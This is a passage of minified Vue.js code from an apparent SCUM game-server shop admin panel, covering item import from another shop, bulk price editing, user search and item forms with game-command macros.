c=!1,t.prev=27,t.next=30,f({method:"POST",url:"".concat(window.BACKEND_HOST,"/imageAdminSys/imageUploadUrl"),data:{url:l.image.startsWith("/upload")?e.importItemsYingZiBaseUrl+l.image:l.image}});case 30:return(d=t.sent)&&d.data&&200===d.data.code?(a[l.image]=d.data.url,r++):(console.error(d.data),c=!0,e.importYingZiUploadFailures.push("".concat(e.importYingZiUploadFailures.length+1,": ").concat(l.name," ").concat(l.image))),u={name:d.data.data.split("?")[1],url:d.data.data},t.next=35,f({method:"POST",url:"/attachmentsAdminSys/add",data:u});case 35:t.next=41;break;case 37:t.prev=37,t.t0=t.catch(27),console.error(t.t0),c||e.importYingZiUploadFailures.push("".concat(e.importYingZiUploadFailures.length+1,": ").concat(l.name," ").concat(l.image));case 41:return t.prev=41,n++,e.$set(e.importItemsUploadStatus,"current",n),t.finish(41);case 45:t.next=21;break;case 47:t.next=52;break;case 49:t.prev=49,t.t1=t.catch(19),o.e(t.t1);case 52:return t.prev=52,o.f(),t.finish(52);case 55:e.$message.info("成功上传".concat(r,"个附件")),console.log("attachmentsMap",a),i.rows=i.rows.map((function(e){return e.image=a[e.image]||e.image,e})),t.next=87;break;case 60:e.$set(e,"importItemsUploadStatus",{stage:"uploadImg",current:0,total:i.data.length}),p=0,m=0,g=R()(Date.now()).format("YYYYMMDDHHmm"),h={},y=Object(we.a)(i.data);try{for(y.s();!(v=y.n()).done;)x=v.value,void 0===h[x.imgSrc]&&(h[x.imgSrc]="".concat(g," - ").concat(x.imgSrc.split("/")[x.imgSrc.split("/").length-1].split(".")[0]))}catch(e){y.e(e)}finally{y.f()}t.t2=regeneratorRuntime.keys(h);case 68:if((t.t3=t.t2()).done){t.next=86;break}return b=t.t3.value,t.prev=70,S={name:h[b],url:b},t.next=74,f({method:"POST",url:"/attachmentsAdminSys/add",data:S});case 74:p++,t.next=80;break;case 77:t.prev=77,t.t4=t.catch(70),console.error(t.t4);case 80:return t.prev=80,m++,e.$set(e.importItemsUploadStatus,"current",m),t.finish(80);case 84:t.next=68;break;case 86:e.$message.info("成功导入".concat(p,"个附件"));case 87:return t.prev=87,w="own"===e.importItemsType?i.data.length:"yingzi"===e.importItemsType?i.rows.length:0,e.$set(e,"importItemsUploadStatus",{stage:"uploadData",current:0,total:w}),t.next=92,f({method:"POST",url:"/itemAdminSys/import",data:{type:e.importItemsType,data:"own"===e.importItemsType?i.data:"yingzi"===e.importItemsType?i.rows:null}});case 92:L=t.sent,e.importItemsLoading=!1,200===L.status?(e.showImportItemsItemModal=!1,e.importItemsLoading=!1,k=L.data,I=k.success,_=k.fail,e.$message.success("已执行导入，成功".concat(I,"条，失败").concat(_,"条")),e.$set(e,"importItemsUploadStatus",{stage:"done",current:w,total:w}),e.getItemTypeList(),e.getItemList()):(e.$set(e,"importItemsUploadStatus",{stage:"none",current:0,total:0}),console.log("错误",L),e.$message.error(L.msg)),t.next=102;break;case 97:t.prev=97,t.t5=t.catch(87),e.$set(e,"importItemsUploadStatus",{stage:"none",current:0,total:0}),e.importItemsLoading=!1,e.$message.error(t.t5);case 102:t.next=109;break;case 104:t.prev=104,t.t6=t.catch(2),console.error(t.t6),e.importItemsLoading=!1,e.$message.error(t.t6.toString());case 109:case"end":return t.stop()}}),t,null,[[2,104],[19,49,52,55],[27,37,41,45],[70,77,80,84],[87,97]])})))()},submitUpdateItemPrice:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.updateItemPriceForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n,r,o,s,l,c,d,u,p;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=17;break}return a=Object(A.cloneDeep)(e.updateItemPriceForm),n=a.action,r=a.param,o={action:n,param:r},"multi"===e.updateItemPriceModalType&&(o.ids=e.selectedRowKeys),e.updateItemPriceLoading=!0,t.prev=5,t.next=8,f({method:"PUT",url:"multi"===e.updateItemPriceModalType?"/itemAdminSys/updateItemsPrice":"/itemAdminSys/updateItemAllPrice",data:o});case 8:s=t.sent,e.updateItemPriceLoading=!1,200===s.status?("multi"===e.updateItemPriceModalType?null!=s&&null!==(l=s.data)&&void 0!==l&&null!==(c=l.failIds)&&void 0!==c&&c.length?e.$message.warning("成功".concat(null==s||null===(d=s.data)||void 0===d?void 0:d.success,"个，以下ID删除出错: ").concat(null==s||null===(u=s.data)||void 0===u||null===(p=u.failIds)||void 0===p?void 0:p.join(","))):e.$message.success("操作成功"):e.$message.success("批量修改成功"),e.updateItemPriceModal=!1,e.updateItemPriceModalType="normal",e.add2EditItemLoading=!1,e.updateItemPriceForm={action:"plus",param:1},e.getItemList()):(console.log("错误",s),e.$message.error(s.msg)),t.next=17;break;case 13:t.prev=13,t.t0=t.catch(5),console.error(t.t0),e.add2EditItemLoading=!1;case 17:case"end":return t.stop()}}),t,null,[[5,13]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},handleSearchSpecificUserName:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t){var i,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,i={keyword:t},e.next=4,f({method:"GET",url:"/userAdminSys/searchUsers",params:i});case 4:200===(a=e.sent).status&&(this.searchSpecificUserNameList=a.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t){return e.apply(this,arguments)}}(),500),handleSearchSpecificReceiveDollarsUserName:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t){var i,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,i={keyword:t},e.next=4,f({method:"GET",url:"/userAdminSys/searchUsers",params:i});case 4:200===(a=e.sent).status&&(this.searchMoneyToUserNameList=a.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t){return e.apply(this,arguments)}}(),500),loadInitialSpecificUserName:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={keywords:e},i.prev=1,i.next=4,f({method:"GET",url:"/userAdminSys/searchUsersMulti",params:a});case 4:200===(n=i.sent).status?(console.log(n.data),t.searchSpecificUserNameList=n.data):(console.log("错误",n),t.$message.error(n.msg)),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},loadInitialMoneyToUserName:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={keyword:e},i.prev=1,i.next=4,f({method:"GET",url:"/userAdminSys/searchUsers",params:a});case 4:200===(n=i.sent).status&&(t.searchMoneyToUserNameList=n.data),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()}}},Ue=$e,Ne=Object(S.a)(Ue,(function(){var e=this,t=this,i=t.$createElement,a=t._self._c||i;return a("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[a("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[a("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[a("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[a("span",[t._v("搜索过滤条件")]),t.userInfo&&"sysAdmin"===t.userInfo.role?a("a-button",{staticStyle:{float:"right"},attrs:{size:"small",icon:"import"},nativeOn:{click:function(e){return e.stopPropagation(),function(){t.importItemsTxt="",t.importItemsType="own",t.importItemsYingZiBaseUrl="",t.importItemsUploadStatus={stage:"none",current:0,total:0},t.showImportItemsItemModal=!0}.apply(null,arguments)}}},[t._v("导入商品")]):t._e(),t.userInfo&&"sysAdmin"===t.userInfo.role?a("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"export",loading:t.exportLoading},nativeOn:{click:function(e){return e.stopPropagation(),t.clickExportItemsList.apply(null,arguments)}}},[t._v("导出所有商品")]):t._e(),a("a-dropdown",[a("a-menu",{attrs:{slot:"overlay"},slot:"overlay"},[a("a-menu-item",{attrs:{disabled:!(t.userInfo&&("sysAdmin"===t.userInfo.role||"admin"===t.userInfo.role))},nativeOn:{click:function(e){return function(e){return t.clickUpdateAllTeleport(!0)}.apply(null,arguments)}}},[t._v("全部更新为传送")]),a("a-menu-item",{attrs:{disabled:!(t.userInfo&&("sysAdmin"===t.userInfo.role||"admin"===t.userInfo.role))},nativeOn:{click:function(e){return function(e){return t.clickUpdateAllTeleport(!1)}.apply(null,arguments)}}},[t._v("全部更新为不传送")])],1),!t.userInfo||"sysAdmin"!==t.userInfo.role&&"admin"!==t.userInfo.role?t._e():a("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"swap",loading:t.updateAllTeleportLoading}},[t._v("切换发货方式"),a("a-icon",{attrs:{type:"down"}})],1)],1),!t.userInfo||"sysAdmin"!==t.userInfo.role&&"admin"!==t.userInfo.role?t._e():a("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"edit"},nativeOn:{click:function(e){return e.stopPropagation(),function(){t.updateItemPriceModal=!0}.apply(null,arguments)}}},[t._v("批量修改商品价格")]),a("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(e){return e.stopPropagation(),t.onItemListFilter.apply(null,arguments)}}},[t._v("过滤")]),a("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(e){return e.stopPropagation(),t.onItemListCleanFilter.apply(null,arguments)}}},[t._v("清空过滤 / 刷新")])],1),a("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[a("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block"}},[t._v("商品名称:")]),a("a-input",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{placeholder:"模糊搜索",allowClear:""},model:{value:t.itemListFilter.name,callback:function(e){t.$set(t.itemListFilter,"name",e)},expression:"itemListFilter.name"}}),a("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block","margin-left":"15px"}},[t._v("商品类型:")]),a("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:t.itemListFilter.type,callback:function(e){t.$set(t.itemListFilter,"type",e)},expression:"itemListFilter.type"}},[a("a-select-option",{key:"null",attrs:{title:"-"}},[t._v("-")]),t._l(t.itemTypesList,(function(e){return a("a-select-option",{key:e.name,attrs:{title:e.cnName}},[t._v(t._s(e.cnName))])}))],2)],1)])],1),a("a-row",{staticStyle:{height:"32px","line-height":"32px"}},[a("div",{staticStyle:{width:"calc(100% - 448px)","font-weight":"bolder",color:"#ff4d4f","text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap",display:"inline-block","vertical-align":"top"}},[t._v("*注意: 一些系统预设类型的商品不能被删除")]),!t.userInfo||"sysAdmin"!==t.userInfo.role&&"admin"!==t.userInfo.role?t._e():a("a-button",{staticStyle:{float:"right",transform:"translateY(4px)"},attrs:{type:"primary",size:"small",icon:"plus"},on:{click:t.clickAddItem}},[t._v("新增")]),t.userInfo&&("sysAdmin"===t.userInfo.role||"admin"===t.userInfo.role)&&t.selectedRowKeys.length>0?a("a-popconfirm",{attrs:{placement:"right",title:"确定要删除选中商品吗"},on:{confirm:function(){return t.deleteItems()}}},[t.userInfo&&("sysAdmin"===t.userInfo.role||"admin"===t.userInfo.role)&&t.selectedRowKeys.length>0?a("a-button",{staticStyle:{float:"right",transform:"translateY(4px)","margin-right":"10px"},attrs:{size:"small",type:"danger",icon:"delete"}},[t._v("删除选中")]):t._e()],1):t._e(),t.userInfo&&("sysAdmin"===t.userInfo.role||"admin"===t.userInfo.role)&&t.selectedRowKeys.length>0?a("a-button",{staticStyle:{float:"right",transform:"translateY(4px)","margin-right":"10px"},attrs:{size:"small",icon:"edit"},on:{click:function(){t.updateItemPriceModal=!0,t.updateItemPriceModalType="multi"}}},[t._v("修改选中商品价格")]):t._e(),t.selectedRowKeys.length>0?a("a-button",{staticStyle:{float:"right",transform:"translateY(4px)","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return t.doCopyCommands(t.selectedRowKeys.join(" "))}}},[t._v("复制商品ID")]):t._e()],1),a("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:t.itemListColumns,"data-source":t.itemListData,"row-key":"id",pagination:!1,loading:t.loadingItemListTable,"row-selection":{selectedRowKeys:t.selectedRowKeys,onChange:function(e){t.selectedRowKeys=e},getCheckboxProps:function(e){return{props:{disabled:t.isSpecialItem(e)}}}},bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:t._u([{key:"name",fn:function(e){return[a("span",[t._v(t._s(e))])]}},{key:"type",fn:function(e,i){return[i.itemType&&i.itemType.cnName?[a("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){t.$router.push({path:"/items",query:{category:"item-type",cnName:i.itemType.cnName}}),t.location.reload()}}},[t._v(t._s(i.itemType.cnName))])]:a("span",[t._v(t._s(e||"-"))])]}},{key:"price",fn:function(e,i){return[a("span",[t._v(t._s(!i.itemType||"special-welcomepack"!==i.itemType.name&&"special-fames"!==i.itemType.name&&"special-send-game-message"!==i.itemType.name?e:"-"))])]}},{key:"imgSrc",fn:function(e,i){return[e?a("div",{staticStyle:{width:"100%",height:"auto","text-align":"center"}},[a("img",{staticStyle:{"max-width":"120px",height:"120px"},attrs:{src:i.imgSrc}})]):a("span",[t._v("暂无")])]}},{key:"sales",fn:function(e){return[a("span",[t._v(t._s(e))])]}},{key:"createdTimeStamp",fn:function(e){return[a("span",[t._v(t._s(e?t.moment(parseInt(e)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"controls",fn:function(e,i){return[!t.userInfo||"sysAdmin"!==t.userInfo.role&&"admin"!==t.userInfo.role?a("span",[t._v("暂无可用操作")]):[a("a-button",{attrs:{size:"small",icon:"edit"},on:{click:function(){t.clickUpdateItem(i)}}},[t._v("修改")]),a("a-popconfirm",{attrs:{placement:"right",title:"确定置顶该商品吗?该商品将在商城用户端购买页面同类型商品中优先展示"},on:{confirm:function(){return t.topItem(i.id)}}},[a("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"to-top"}},[t._v("置顶")])],1),a("a-popconfirm",{attrs:{placement:"right",title:"确定要删除商品类型吗"},on:{confirm:function(){return!t.isSpecialItem(i)&&t.deleteItem(i.id)}}},[a("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"danger",icon:"delete",disabled:t.isSpecialItem(i)}},[t._v("删除")])],1),a("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return t.doCopyCommands(i.id)}}},[t._v("复制商品ID")])]]}}])}),a("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":t.itemListPagination.pageSize,current:t.itemListPagination.pageNum,total:t.itemListPagination.total},on:{change:t.onChangeItemListPagination,showSizeChange:t.onShowSizeChangeItemListPagination}}),a("a-modal",{attrs:{title:"导入商品","mask-closable":!1,width:600},on:{cancel:function(){t.showImportItemsItemModal=!1,t.importItemsType="own",t.importItemsTxt="",t.importItemsYingZiBaseUrl="",t.$set(e,"importItemsUploadStatus",{stage:"none",current:0,total:0})}},model:{value:t.showImportItemsItemModal,callback:function(e){t.showImportItemsItemModal=e},expression:"showImportItemsItemModal"}},[a("template",{slot:"footer"},[a("a-button",{attrs:{type:"primary",loading:t.importItemsLoading},on:{click:t.submitImportItems}},[t._v("开始导入")])],1),a("div",{staticStyle:{width:"100%"}},[a("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f"}},[t._v("*")]),a("span",{staticStyle:{"margin-left":"5px"}},[t._v("选择导入类型：")]),a("a-radio-group",{attrs:{buttonStyle:"solid",size:"small"},model:{value:t.importItemsType,callback:function(e){t.importItemsType=e},expression:"importItemsType"}},[a("a-radio-button",{attrs:{value:"own"}},[t._v("从本系统导入")]),a("a-radio-button",{attrs:{value:"yingzi"}},[t._v("从影子商城导入")])],1),t.importItemsType&&"own"!==t.importItemsType?a("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f","margin-left":"15px"}},[t._v("*打击奸商，造福SCUM圈")]):t._e()],1),t.importItemsType&&"yingzi"===t.importItemsType?[a("div",{staticStyle:{width:"100%","margin-top":"10px"}},[a("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f"}},[t._v("*")]),a("span",{staticStyle:{"margin-left":"5px"}},[t._v("来源商城的HOST")]),a("a-tooltip",{attrs:{title:"例如: http://11.22.333.44:1234"}},[a("a-icon",{staticStyle:{margin:"0 3px"},attrs:{type:"info-circle",theme:"filled"}})],1),a("span",[t._v(":")])],1),a("div",{staticStyle:{width:"100%"}},[a("a-input",{model:{value:t.importItemsYingZiBaseUrl,callback:function(e){t.importItemsYingZiBaseUrl=e},expression:"importItemsYingZiBaseUrl"}})],1)]:t._e(),a("div",{staticStyle:{width:"100%","margin-top":"10px"}},[a("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f"}},[t._v("*")]),a("span",{staticStyle:{"margin-left":"5px"}},[t._v("导入内容：")])]),a("div",{staticStyle:{width:"100%"}},[a("a-input",{staticStyle:{width:"100%","margin-top":"10px"},attrs:{type:"textarea","auto-size":{minRows:15,maxRows:15}},model:{value:t.importItemsTxt,callback:function(e){t.importItemsTxt=e},expression:"importItemsTxt"}})],1),"none"!==t.importItemsUploadStatus.stage?a("div",{staticStyle:{width:"100%","margin-top":"10px"}},[a("a-progress",{staticStyle:{width:"calc(100% - 50px)"},attrs:{percent:"done"===t.importItemsUploadStatus.stage?100:99,status:"done"===t.importItemsUploadStatus.stage?"success":"active"},scopedSlots:t._u([{key:"format",fn:function(e){return[t._e(),a("span",[t._v(t._s(t.importItemsUploadStatusStageMap[t.importItemsUploadStatus.stage])+t._s(t.importItemsUploadStatus.current)+" / "+t._s(t.importItemsUploadStatus.total))])]}}],null,!1,3824684399)})],1):t._e(),t.importYingZiUploadFailures&&t.importYingZiUploadFailures.length?a("div",{staticStyle:{width:"100%","margin-top":"10px"}},[a("span",{staticStyle:{"margin-left":"5px"}},[t._v("失败记录：")])]):t._e(),t.importYingZiUploadFailures&&t.importYingZiUploadFailures.length?a("div",{staticStyle:{width:"100%"}},[a("a-input",{staticStyle:{width:"100%","margin-top":"10px",color:"red"},attrs:{disabled:"",value:t.importYingZiUploadFailures.join("\n"),type:"textarea","auto-size":{minRows:5,maxRows:5}}})],1):t._e()],2),a("a-modal",{attrs:{title:"批量修改商品价格("+("multi"===t.updateItemPriceModalType?t.selectedRowKeys.length+"个":"全部")+")","mask-closable":!1,width:800},on:{cancel:function(){t.updateItemPriceModal=!1,t.updateItemPriceModalType="normal",t.$set(e,"updateItemPriceForm",{action:"plus",param:1})}},model:{value:t.updateItemPriceModal,callback:function(e){t.updateItemPriceModal=e},expression:"updateItemPriceModal"}},[a("template",{slot:"footer"},[a("a-button",{attrs:{type:"primary",loading:t.updateItemPriceLoading},on:{click:t.submitUpdateItemPrice}},[t._v("提交")])],1),a("a-alert",{staticStyle:{"margin-bottom":"10px"},attrs:{"show-icon":"",message:"被修改价格的商品不包括所有系统特殊商品",type:"info"}}),t.updateItemPriceModal?a("a-form-model",{ref:"updateItemPriceForm",staticStyle:{"max-width":"800px"},attrs:{model:t.updateItemPriceForm,rules:t.updateItemPriceRules,"label-col":{span:6},"wrapper-col":{span:18}}},[a("a-form-model-item",{attrs:{label:"原来的商品价格",prop:"action"}},[a("a-select",{staticStyle:{width:"200px"},model:{value:t.updateItemPriceForm.action,callback:function(e){t.$set(t.updateItemPriceForm,"action",e)},expression:"updateItemPriceForm.action"}},[a("a-select-option",{key:"plus",attrs:{title:"加"}},[t._v("加")]),a("a-select-option",{key:"minus",attrs:{title:"减"}},[t._v("减")]),a("a-select-option",{key:"multiple",attrs:{title:"乘"}},[t._v("乘")]),a("a-select-option",{key:"divide",attrs:{title:"除以"}},[t._v("除以")])],1)],1),a("a-form-model-item",{attrs:{label:"参数",prop:"param"}},[a("a-input-number",{staticStyle:{width:"200px"},attrs:{min:0},model:{value:t.updateItemPriceForm.param,callback:function(e){t.$set(t.updateItemPriceForm,"param",e)},expression:"updateItemPriceForm.param"}})],1)],1):t._e()],2),a("a-modal",{attrs:{title:("add"===t.add2EditItemModalType?"新增":"编辑")+"商品类型","mask-closable":!1,width:900},on:{cancel:t.clickCancelAdd2EditItemModal},model:{value:t.showAdd2EditItemModal,callback:function(e){t.showAdd2EditItemModal=e},expression:"showAdd2EditItemModal"}},[a("template",{slot:"footer"},[a("a-button",{attrs:{type:"primary",loading:t.add2EditItemLoading},on:{click:t.submitAdd2EditItem}},[t._v("提交")])],1),t.add2EditItemForm&&t.add2EditItemForm.type&&t.specialTips[t.add2EditItemForm.type]?a("a-alert",{staticStyle:{"margin-bottom":"10px"},attrs:{"show-icon":"",message:t.specialTips[t.add2EditItemForm.type],type:"warning"}}):t._e(),t.showAdd2EditItemModal?a("a-form-model",{ref:"add2EditItemForm",staticStyle:{"max-width":"800px"},attrs:{model:t.add2EditItemForm,rules:t.add2EditItemRules,"label-col":{span:6},"wrapper-col":{span:18}}},[a("a-form-model-item",{attrs:{label:"商品名称",prop:"name"}},[a("a-input",{attrs:{disabled:"edit"===t.add2EditItemModalType&&t.add2EditItemForm.type&&t.add2EditItemForm.type.startsWith("special-"),allowClear:""},model:{value:t.add2EditItemForm.name,callback:function(e){t.$set(t.add2EditItemForm,"name",e)},expression:"add2EditItemForm.name"}})],1),a("a-form-model-item",{attrs:{label:"商品类型",prop:"type"}},[a("a-select",{attrs:{allowClear:"",disabled:"edit"===t.add2EditItemModalType&&t.add2EditItemForm.type&&t.add2EditItemForm.type.startsWith("special-")},model:{value:t.add2EditItemForm.type,callback:function(e){t.$set(t.add2EditItemForm,"type",e)},expression:"add2EditItemForm.type"}},t._l(t.itemTypesList,(function(e){return a("a-select-option",{key:e.name,attrs:{title:e.cnName,disabled:e.name.startsWith("special-")}},[t._v(t._s(e.cnName))])})),1)],1),"special-welcomepack"!==t.add2EditItemForm.type&&"special-fames"!==t.add2EditItemForm.type?a("a-form-model-item",{attrs:{label:"价格",prop:"price"}},[a("a-input-number",{attrs:{disabled:"special-welcomepack"===t.add2EditItemForm.type||"special-fames"===t.add2EditItemForm.type,min:0,allowClear:""},model:{value:t.add2EditItemForm.price,callback:function(e){t.$set(t.add2EditItemForm,"price",e)},expression:"add2EditItemForm.price"}})],1):t._e(),a("a-form-model-item",{attrs:{label:"商品效果类型",prop:"configType"}},[a("a-radio-group",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.configTypeLimitType.find((function(e){return e===t.add2EditItemForm.type}))},on:{change:function(e){t.$refs.add2EditItemForm.clearValidate(),"dollar"===e.target.value?(t.add2EditItemForm.commands="none",t.add2EditItemForm.configs.multiple=!1,t.add2EditItemForm.configs.multiTime=0,t.add2EditItemForm.configs.enableDiyLocation=!1,t.add2EditItemForm.configs.diyLocation=""):t.add2EditItemForm.commands=""}},model:{value:t.add2EditItemForm.configType,callback:function(e){t.$set(t.add2EditItemForm,"configType",e)},expression:"add2EditItemForm.configType"}},[a("a-radio",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.configTypeLimitType.find((function(e){return e===t.add2EditItemForm.type})),value:"command"}},[t._v("生成命令")]),a("a-radio",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.configTypeLimitType.find((function(e){return e===t.add2EditItemForm.type})),value:"dollar"}},[t._v("美金礼包")])],1)],1),a("a-form-model-item",{attrs:{label:"是否下架",prop:"isBlock"}},[a("a-switch",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.isBlockLimitType.find((function(e){return e===t.add2EditItemForm.type}))},on:{change:function(){t.$refs.add2EditItemForm.clearValidate()}},model:{value:t.add2EditItemForm.isBlock,callback:function(e){t.$set(t.add2EditItemForm,"isBlock",e)},expression:"add2EditItemForm.isBlock"}})],1),t.add2EditItemForm.configType&&"command"!==t.add2EditItemForm.configType?a("a-form-model-item",{attrs:{label:"套餐包含美金",prop:"configs.addDollar",rules:{required:void 0!==t.add2EditItemForm.configType&&"dollar"===t.add2EditItemForm.configType,trigger:"change",message:"套餐包含美金须>=0",validator:function(e,i,a){void 0!==t.add2EditItemForm.configType&&"dollar"===t.add2EditItemForm.configType&&"number"==typeof i&&i>=0||!t.add2EditItemForm.configType||"command"===t.add2EditItemForm.configType?a():a(new t.Error("套餐包含美金须>=0"))}}}},[a("a-input-number",{attrs:{min:0,allowClear:""},model:{value:t.add2EditItemForm.configs.addDollar,callback:function(e){t.$set(t.add2EditItemForm.configs,"addDollar",e)},expression:"add2EditItemForm.configs.addDollar"}})],1):a("a-form-model-item",{attrs:{prop:"commands"}},[a("template",{slot:"label"},[a("span",[t._v("生成命令")]),a("a-tooltip",{attrs:{placement:"top",title:"每一条命令使用回车键换行隔开(特殊命令: <ctrl-a> - 全选; <x> - 按下X键; <ctrl-c> - 复制; <ctrl-v> - 粘贴; <enter> - 回车; <tab> / <tab-n> - tab键; <clean-didi-vehicles> - 清空滴滴车)"}},[a("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),a("div",{staticStyle:{width:"100%",position:"relative"}},[a("a-input",{attrs:{type:"textarea","auto-size":{minRows:6,maxRows:6}},model:{value:t.add2EditItemForm.commands,callback:function(e){t.$set(t.add2EditItemForm,"commands",e)},expression:"add2EditItemForm.commands"}}),a("commands-picker",{on:{select:function(e,i){t.add2EditItemForm.commands=t.add2EditItemForm.commands+(t.add2EditItemForm.commands.length?"\n":"")+e+("number"==typeof i&&i>=2?i<=10?" "+i:" 10":""),t.$refs.add2EditItemForm.validateField("commands")}}})],1)],2),a("a-form-model-item",{attrs:{prop:"imgSrc"}},[a("template",{slot:"label"},[a("span",[t._v("图片链接")]),a("a-popover",{attrs:{placement:"left"}},[a("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[a("p",{staticStyle:{"font-weight":"bolder"}},[t._v("可以上传图片或图片url")])]),a("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),a("div",{staticStyle:{width:"100%"}},[a("image-select",{attrs:{disabled:!1,"show-upload-config":t.showUploadConfig,value:t.add2EditItemForm.imgSrc},on:{"change-show-upload-config":function(e){t.showUploadConfig=e},change:function(e){t.$set(t.add2EditItemForm,"imgSrc",e),t.$nextTick((function(){t.$refs.add2EditItemForm.validate()}))}}})],1)],2),"edit"!==t.add2EditItemModalType||"special-welcomepack"!==t.add2EditItemForm.type&&"special-welcome-didi"!==t.add2EditItemForm.type&&"special-login-set-everyday"!==t.add2EditItemForm.type?t._e():a("a-form-model-item",{attrs:{label:("special-welcomepack"===t.add2EditItemForm.type?"新手礼包":"special-welcome-didi"===t.add2EditItemForm.type?"新手滴滴车":"每日登录礼包")+"描述",prop:"configs.description",rules:{required:"edit"===t.add2EditItemModalType&&("special-welcomepack"===t.add2EditItemForm.type||"special-welcome-didi"===t.add2EditItemForm.type||"special-login-set-everyday"===t.add2EditItemForm.type),trigger:"change",message:"描述不能为空",validator:function(e,i,a){"edit"===t.add2EditItemModalType&&("special-welcomepack"===t.add2EditItemForm.type||"special-welcome-didi"===t.add2EditItemForm.type||"special-login-set-everyday"===t.add2EditItemForm.type)&&i&&i.length>0||"edit"!==t.add2EditItemModalType||"special-welcomepack"!==t.add2EditItemForm.type&&"special-welcome-didi"!==t.add2EditItemForm.type&&"special-login-set-everyday"!==t.add2EditItemForm.type?a():a(new t.Error("描述不能为空"))}}}},[a("a-input",{attrs:{type:"textarea","auto-size":{minRows:6,maxRows:6},min:0,allowClear:""},model:{value:t.add2EditItemForm.configs.description,callback:function(e){t.$set(t.add2EditItemForm.configs,"description",e)},expression:"add2EditItemForm.configs.description"}})],1),a("a-form-model-item",{attrs:{label:"销量",prop:"sales"}},[a("a-input-number",{attrs:{min:0,allowClear:""},model:{value:t.add2EditItemForm.sales,callback:function(e){t.$set(t.add2EditItemForm,"sales",e)},expression:"add2EditItemForm.sales"}})],1),void 0===t.add2EditItemForm.configType||"dollar"!==t.add2EditItemForm.configType?a("a-form-model-item",{attrs:{prop:"configs.isTeleport"}},[a("template",{slot:"label"},[a("span",[t._v("是否传送到玩家身边")]),a("a-popover",{attrs:{placement:"left"}},[a("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[a("p",{staticStyle:{"font-weight":"bolder"}},[t._v("默认为开，关闭请谨慎，对于发货内容含有载具或者僵尸的商品，不建议关闭(游戏官方的bug，大概率会发到错误的位置)")])]),a("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),a("a-switch",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.isTeleportLimitType.find((function(e){return 